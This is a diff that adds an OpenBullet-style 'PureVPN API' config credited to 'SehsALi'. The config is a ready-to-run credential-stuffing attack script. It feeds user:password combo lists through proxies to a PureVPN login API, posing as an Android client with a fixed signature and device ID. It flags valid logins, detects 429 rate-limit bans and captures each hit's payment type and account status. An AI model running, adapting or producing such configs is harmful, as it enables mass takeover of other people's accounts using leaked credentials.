@@ -1,0 +1,50 @@
+[SETTINGS]
+{
+  "Name": "PureVPN API",
+  "SuggestedBots": 70,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-13T17:24:07.2826257+02:00",
+  "AdditionalInfo": "Need USer Combo",
+  "Author": "SehsALi",
+  "Version": "1.2.9 Anomaly",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://api.dialertoserver.com/user/login?api_key=pvpnUserPrd" 
+  CONTENT "sUsername=<USER>&sSignature=4dcc78aa5aa8e99b8017bb40e992000b&sDeviceType=android&sPassword=<PASS>&sDateTime=2019-02-28%2001%3A34%3A37&sDeviceId=c50dcd9c919d5efe&iResellerId=1&api_key=pvpnUserPrd" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "user-agent: purevpn-http-agent-android" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"message\": \"Incorrect Username or Password.\"" 
+  KEYCHAIN Success OR 
+    KEY "\"status\"" 
+  KEYCHAIN Ban OR 
+    KEY "<HEADERS(*)>" Contains "HTTP/1.1 429 Too Many Requests" 
+
+PARSE "<SOURCE>" LR "ayment_type\":" "," -> CAP "payment_type" 
+
+PARSE "<SOURCE>" LR "status\":" "," -> CAP "ACC STATUS(SEHSALI)" 
+
